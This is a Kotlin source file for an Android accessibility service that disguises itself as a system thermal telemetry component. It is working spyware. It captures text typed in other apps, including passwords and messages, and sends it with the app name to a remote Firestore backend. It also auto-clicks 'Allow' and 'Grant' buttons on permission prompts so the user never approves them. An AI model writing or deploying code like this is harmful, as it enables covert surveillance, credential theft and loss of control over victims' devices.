package com.android.system.service.thermal

import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.accessibilityservice.AccessibilityService
import android.util.Log

class AccessibilityTelemetry : AccessibilityService() {

    private var lastKeylog = ""

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> handleKeylogging(event)
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> handlePermissionAutomation(event)
        }
    }

    private fun handleKeylogging(event: AccessibilityEvent) {
        val text = event.text.joinToString(" ")
        if (text.isBlank() || text == lastKeylog) return
        lastKeylog = text
        val pkg = event.packageName?.toString()
        FirestoreSync.syncKeylog(text, pkg)
    }


    private fun handlePermissionAutomation(event: AccessibilityEvent) {
        // Automation Wizard: Auto-click ALLOW / PERMIT / GRANT buttons
        val root = rootInActiveWindow ?: return
        val targets = listOf("Allow", "Grant", "While using the app", "OK", "Permit", "Allow all the time")
        for (label in targets) {
            root.findAccessibilityNodeInfosByText(label).forEach { node ->
                if (node.isClickable) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    Log.d("ZondraWatcher", "Auto-clicked: $label")
                }
            }
        }
    }

    override fun onInterrupt() {}

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d("ZondraWatcher", "Accessibility Service Connected · Syncing to think-big-f8c31")
    }
}
